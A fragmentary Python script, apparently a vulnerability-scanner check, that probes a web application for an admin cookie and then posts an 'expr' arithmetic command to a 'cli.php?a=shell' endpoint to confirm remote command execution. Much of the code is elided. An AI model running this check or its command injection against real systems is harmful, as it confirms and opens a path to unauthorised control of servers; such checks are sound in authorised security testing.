...
def randomInt(s,e):
	...
	return key
r11=randomInt(8000, 10000)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r22=randomInt(8000, 10000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
	...
	if len(reditList)>0:
		...
		if response.status_code == 200 and "text/json" in response.headers["Content-Type"] and "user=admin" in response.headers["Set-Cookie"] and "{\"data\":\"0\",\"status\":1}" in response.text:
			...
			r1=False
	url=baseurl+"cli.php?a=shell"
	body="notdelay=true&command=expr "+str(r11)+" * "+str(r22)+""
	...
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r11 * r22) in response.text:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
